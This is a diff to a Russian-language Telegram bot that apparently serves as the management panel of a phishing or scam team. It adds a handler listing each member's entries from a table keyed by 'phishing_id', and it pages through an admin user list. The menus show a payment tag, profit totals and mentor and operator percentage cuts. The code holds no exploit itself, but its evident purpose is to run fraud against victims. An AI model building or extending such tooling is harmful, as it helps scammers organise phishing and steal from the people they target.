@@ -59,13 +59,13 @@ async def __start(message: Message, state: FSMContext) -> None:
             if result[0][0] == 6:
                 settings = InlineKeyboardButton(text='⚙️ Настройки', callback_data='settings')
                 chats = InlineKeyboardButton(text='💬 Чаты', callback_data='admin_panel')
-                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='admin_panel')
+                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='listings')
                 admin_panel = InlineKeyboardButton(text='🖥 Админ-панель', callback_data='admin_panel')
                 menu = InlineKeyboardMarkup(inline_keyboard=[[listings], [settings], [chats], [admin_panel]])
             else:
                 settings = InlineKeyboardButton(text='⚙️ Настройки', callback_data='settings')
                 chats = InlineKeyboardButton(text='💬 Чаты', callback_data='admin_panel')
-                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='admin_panel')
+                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='listings')
                 menu = InlineKeyboardMarkup(inline_keyboard=[[listings], [settings], [chats]])
             await message.answer(f'<b>💪🏻 СЛОВО ПАЦАНА GROUP\n\n#️⃣ Тэг: <code>#{result[0][1]}</code>\n📯 Статус: <code>{d[result[0][0]]}</code>\n📂 Объявлений: <code>TODO</code>\n💰 Сумма профитов: <code>TODO</code>\n📈 Количество профитов: <code>TODO</code>\n👨‍🏫 Наставник: TODO, ?%\n👨🏻 Оператор: TODO, ?%</b>',
                                  reply_markup=menu)
@@ -101,16 +101,30 @@ async def __start_callback(callback_query: types.CallbackQuery, state: FSMContex
             if result[0][0] == 6:
                 settings = InlineKeyboardButton(text='⚙️ Настройки', callback_data='settings')
                 chats = InlineKeyboardButton(text='💬 Чаты', callback_data='admin_panel')
-                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='admin_panel')
+                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='listings')
                 admin_panel = InlineKeyboardButton(text='🖥 Админ-панель', callback_data='admin_panel')
                 menu = InlineKeyboardMarkup(inline_keyboard=[[listings], [settings], [chats], [admin_panel]])
             else:
                 settings = InlineKeyboardButton(text='⚙️ Настройки', callback_data='settings')
                 chats = InlineKeyboardButton(text='💬 Чаты', callback_data='admin_panel')
-                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='admin_panel')
+                listings = InlineKeyboardButton(text='📂 Обьявления', callback_data='listings')
                 menu = InlineKeyboardMarkup(inline_keyboard=[[listings], [settings], [chats]])
             await bot.edit_message_text(f'<b>💪🏻 СЛОВО ПАЦАНА GROUP\n\n#️⃣ Тэг: <code>#{result[0][1]}</code>\n📯 Статус: <code>{d[result[0][0]]}</code>\n📂 Объявлений: <code>TODO</code>\n💰 Сумма профитов: <code>TODO</code>\n📈 Количество профитов: <code>TODO</code>\n👨‍🏫 Наставник: TODO, ?%\n👨🏻 Оператор: TODO, ?%</b>', cid, mid,
                                  reply_markup=menu)
+
+@router.callback_query(lambda c: c.data == 'listings')
+async def __listings(callback_query: types.CallbackQuery, state: FSMContext):
+    cid = callback_query.message.chat.id
+    mid = callback_query.message.message_id
+    buttons = []
+    listings = cursor.execute("select phishing_id, name, service from listings where uid=?", (callback_query.from_user.id,)).fetchall()
+    for lst in listings:
+        buttons.append([InlineKeyboardButton(text=(cursor.execute('select flag from services where service=?', (lst[2],)).fetchone()[0] + " | " + str(lst[1]) + " | " + str(lst[0])), callback_data=f'listing{lst[0]}')])
+    markup = InlineKeyboardMarkup(inline_keyboard=buttons + [[InlineKeyboardButton(text='⬅️Назад', callback_data='go_start')]])
+    await bot.edit_message_text('''Ваши обьявления''', cid, mid, reply_markup=markup)
+    await state.set_state(CreateUser.question1)
+
+# ----------------- Заявки
 
 @router.callback_query(lambda c: c.data == 'proceed')
 async def __proceed(callback_query: types.CallbackQuery, state: FSMContext):
@@ -164,15 +178,19 @@ async def __decline(callback_query: types.CallbackQuery, state: FSMContext):
     await bot.send_message(int(callback_query.data.replace('decl', '')), "Заявка отклонена.")
     await bot.edit_message_text(callback_query.message.text + "\nЗаявка отклонена.", -4017721930, callback_query.message.message_id)
     
+# ------------------ ADMIN PANEL
+    
 @router.callback_query(lambda c: 'admin_panel' in c.data)
 async def __adminpanel(callback_query: types.CallbackQuery, state: FSMContext):
     cursor.execute('SELECT status FROM users WHERE uid = ?', (callback_query.from_user.id,))
     result = cursor.fetchall()
     if result[0][0] == 6:
-        users = InlineKeyboardButton(text='Пользователи', callback_data='usrscheck')
+        users = InlineKeyboardButton(text='Пользователи', callback_data='usrscheck0')
         markup = InlineKeyboardMarkup(inline_keyboard=[[users]] + [[InlineKeyboardButton(text='⬅️Назад', callback_data='go_start')]])
         await bot.edit_message_text("<b>🖥 Админ-панель</b>", callback_query.from_user.id, callback_query.message.message_id, reply_markup=markup)
-    
+
+# ------------------ PAYTAG
+
 @router.callback_query(lambda c: 'settings' in c.data)
 async def __settpanel(callback_query: types.CallbackQuery, state: FSMContext):
     tag = InlineKeyboardButton(text='Изменить платежный тэг', callback_data='tagchng')
@@ -196,7 +214,9 @@ async def __tagsuccess(message: types.Message, state: FSMContext):
 async def __tagfailure(message: types.Message, state: FSMContext):
     await bot.send_message(message.from_user.id, "Такой тэг уже используется другим пользователем. Пожалуйста, введите другой тэг:")
 
-@router.callback_query(lambda c: c.data == 'usrscheck')
+# ------------------ USERS
+
+@router.callback_query(lambda c: 'usrscheck' in c.data )
 async def __adminpanel(callback_query: types.CallbackQuery, state: FSMContext):
     cursor.execute('SELECT status FROM users WHERE uid = ?', (callback_query.from_user.id,))
     result = cursor.fetchall()
@@ -212,9 +232,11 @@ async def __adminpanel(callback_query: types.CallbackQuery, state: FSMContext):
                     buttons[i // 3].append(InlineKeyboardButton(text=str(user[0]), callback_data=f'user{user[0]}'))
                 i += 1
         pages = []
+        n_page = int(callback_query.data.replace("usrscheck", ''))
         for i in range(0, len(buttons), 10):
             pages.append(buttons[i: i + 10])
-        markup = InlineKeyboardMarkup(inline_keyboard=pages[0]+[[InlineKeyboardButton(text='⬅️Назад', callback_data='admin_panel')]])
+        arrows = [[InlineKeyboardButton(text=f'1 / 1', callback_data="ghjaczskdf")]] if len(pages) == 1 else [[InlineKeyboardButton(text=f'1 / {len(pages)}', callback_data="ghjaczskdf"), InlineKeyboardButton(text='->', callback_data="usrscheck1")]] if n_page == 0 else [[InlineKeyboardButton(text='<-', callback_data=f"usrscheck{len(pages) - 2}"), InlineKeyboardButton(text=f'{len(pages)} / {len(pages)}', callback_data="uazsxecdghijk")]] if n_page == len(pages) - 1 else [[InlineKeyboardButton(text='<-', callback_data=f"usrscheck{n_page - 1}"), InlineKeyboardButton(text=f'{n_page + 1} / {len(pages)}', callback_data="ghjaczskdf"), InlineKeyboardButton(text='->', callback_data=f"usrscheck{n_page + 1}")]]
+        markup = InlineKeyboardMarkup(inline_keyboard=pages[n_page]+arrows+[[InlineKeyboardButton(text='⬅️Назад', callback_data='admin_panel')]])
         await bot.edit_message_text("Пользователи", callback_query.from_user.id, callback_query.message.message_id, reply_markup=markup)
 
 @router.callback_query(lambda c: 'user' in c.data)
